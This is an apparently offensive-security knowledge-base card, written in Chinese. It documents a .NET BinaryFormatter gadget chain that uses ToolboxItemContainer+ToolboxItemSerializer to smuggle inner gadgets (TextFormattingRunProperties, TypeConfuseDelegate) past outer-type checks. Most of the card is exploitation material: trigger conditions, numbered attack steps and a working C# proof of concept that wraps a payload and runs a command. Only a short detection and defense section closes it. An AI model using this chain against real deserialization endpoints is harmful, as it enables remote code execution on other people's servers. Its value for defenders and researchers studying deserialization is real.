---
id: web-dotnet-deser-toolboxitemcontainer-stream-field-binaryformatter
title: ToolboxItemContainer 二段反序列化：ToolboxItemSerializer 反序列化构造函数直接把 Stream 字段交给 BinaryFormatter，可拖运任意内层 gadget 字节
type: scenario
domain: web
path: web/dotnet/deserialization
technique: toolboxitemcontainer-toolboxitemserializer-stream-binaryformatter
tags:
- dotnet
- binaryformatter
- deserialization
- toolboxitemcontainer
- system-drawing-design
- gadget
- second-order
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V670
  verified_at: '2026-11-13T10:13:40+08:00'
  notes: 已对照 img10 核对 ToolboxItemSerializer 反序列化构造函数读取 AssemblyName/Stream 并 _formatter.Deserialize(Stream) 的完整机制与 PoC；原文明确 Stream 字节可换 TypeConfuseDelegate；未实际执行。
url: /docs/web/dotnet/deserialization/web-dotnet-deser-toolboxitemcontainer-stream-field-binaryformatter/
draft: false
kb_aliases:
- ToolboxItemContainer gadget
- ToolboxItemSerializer
- System.Drawing.Design ToolboxItemContainer
- Stream 字段二次反序列化
- BinaryFormatter 拖运容器
- ysoserial ToolboxItemContainer
---

## 一句话结论

`System.Drawing.Design.ToolboxItemContainer+ToolboxItemSerializer` 的反序列化构造函数从 SerializationInfo 取出 `Stream` 字节数组后，直接 `new BinaryFormatter().Deserialize(new MemoryStream(buffer))`；攻击者用 `info.SetType` 指向该内部类、把任意内层 gadget（TextFormattingRunProperties 或 TypeConfuseDelegate 的字节）放进 `Stream` 字段，即可借这个 GAC 内合法类型把恶意序列化流拖运进 BinaryFormatter 并执行。

## 原理

- **载体类**：`System.Drawing.Design.ToolboxItemContainer+ToolboxItemSerializer`（System.Drawing.Design，Version=4.0.0.0，PublicKeyToken=b03f5f7f11d50a3a，GAC 程序集）是 ToolboxItemContainer 的内部序列化器，实现 `ISerializable`。
- **反序列化构造函数**（文章 img10）：`info.GetValue("AssemblyName", typeof(AssemblyName))` 取程序集名；`buffer = (byte[])info.GetValue("Stream", typeof(byte[]))` 取字节流；若静态 `_formatter` 为空则 `new BinaryFormatter()`，临时换入 `ToolboxSerializationBinder`；最后 `this._toolboxItem = _formatter.Deserialize(new MemoryStream(buffer))`。即 `Stream` 字段会被无条件当作 BinaryFormatter 流反序列化。
- **拖运思路**：外层只需是一个"看起来正常"的 ToolboxItemSerializer 记录，内层字节放什么由攻击者决定。文章明确说：传入 Stream 中的是字节，可以用 TypeConfuseDelegate 的 payload 字节替换 TextFormattingRunProperties 的 payload 字节；演示则用 TFRP 字节（`calc`）。
- **为什么成立**：反序列化构造函数把 SerializationInfo 当可信内部状态，而 SerializationInfo 完全由攻击者构造；外层类型名合法（GAC 内已签名类型），只检查外层类型的黑名单会放行，内层恶意 gadget 在 `_formatter.Deserialize` 时真正执行。
- **实测标志**：文章 PoC 在本地 BinaryFormatter 反序列化后弹出计算器；该链常用于需要"外层类型合法"的绕过场景（如 SerializationBinder 只对部分类型做检查）。

## 触发条件

- 存在可控制序列化流的 BinaryFormatter 入口。
- 目标加载 System.Drawing.Design（.NET Framework 自带 GAC 程序集）。
- 内层 gadget 依赖满足（TFRP 需 Microsoft.PowerShell.Editor.dll；TypeConfuseDelegate 需 .NET 4.5+）。
- 反序列化端未对 ToolboxItemContainer/ToolboxItemSerializer 做类型拦截。

## 利用步骤

1. 生成内层 payload：先用 BinaryFormatter 序列化 TFRP（`cmd /c calc`）或 TypeConfuseDelegate 对象，得到字节数组。
2. 实现 `ISerializable` 包装：`info.SetType(Type.GetType("System.Drawing.Design.ToolboxItemContainer+ToolboxItemSerializer, System.Drawing.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"))`；`info.AddValue("AssemblyName", new AssemblyName())`；`info.AddValue("Stream", payloadBytes)`。
3. 用 BinaryFormatter 序列化包装对象并投递。
4. 反序列化端 ToolboxItemSerializer 构造函数 → `_formatter.Deserialize(Stream)` → 内层 gadget 执行命令。

## PoC

```csharp
[Serializable]
public class ToolboxItemSerializerMarshal : ISerializable
{
    private readonly byte[] _payload;
    public ToolboxItemSerializerMarshal(byte[] payload) { _payload = payload; }

    public void GetObjectData(SerializationInfo info, StreamingContext context)
    {
        info.SetType(Type.GetType(
            "System.Drawing.Design.ToolboxItemContainer+ToolboxItemSerializer, System.Drawing.Design, " +
            "Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"));
        info.AddValue("AssemblyName", new AssemblyName());
        info.AddValue("Stream", _payload);
    }
}

// 生成：内层 TFRP 字节 -> 外层序列化
byte[] inner;
using (var ms = new MemoryStream())
{
    new BinaryFormatter().Serialize(ms, new TextFormattingRunPropertiesMarshal("calc"));
    inner = ms.ToArray();
}
using (var ms = new MemoryStream())
{
    new BinaryFormatter().Serialize(ms, new ToolboxItemSerializerMarshal(inner));
    ms.Position = 0;
    new BinaryFormatter().Deserialize(ms); // 弹出计算器
}
```

## 变体与关联

- 变体：内层字节可替换为 TypeConfuseDelegate（.NET 4.5+）或任意 BinaryFormatter gadget；文章指出这也是该容器的通用用法。
- 变体：同类"字段直达 BinaryFormatter"的二段载体还有 `AxHost.State` 的 `PropertyBagBinary`（见 ActivitySurrogateSelector 卡）与 `DataSet.Tables_0`（见关联卡）。
- 关联：[[web-dotnet-deser-textformattingrunproperties-xamlreader-odp-gadget]]（常用内层载荷）、[[web-dotnet-deser-typeconfusedelegate-sortedset-delegate-confusion]]、[[web-dotnet-deser-dataset-serializationinfo-tables-binaryformatter-readxml-xmlserializer]]、[[web-dotnet-deser-activitysurrogateselector-linq-assembly-load-gadget]]（AxHost.State 外层封装）。
- 边界：目标没有 System.Drawing.Design 时不可用；ToolboxSerializationBinder 可能限制内层类型，实战需按目标 Binder 行为选择内层 gadget。

## 检测与防御

- 检测：序列化流中出现 `ToolboxItemContainer`、`ToolboxItemSerializer`、`System.Drawing.Design` 等类型名；外层合法类型内部再出现 `TextFormattingRunProperties`/`SortedSet` 等内层 gadget 类型。
- 修复：禁用 `BinaryFormatter`；对反序列化类型做白名单（排除 ToolboxItemSerializer）；升级 .NET Framework。
- 加固：WAF/EDR 检测嵌套 BinaryFormatter 流特征；业务不需要 System.Drawing.Design 的服务端进程限制相关程序集加载。
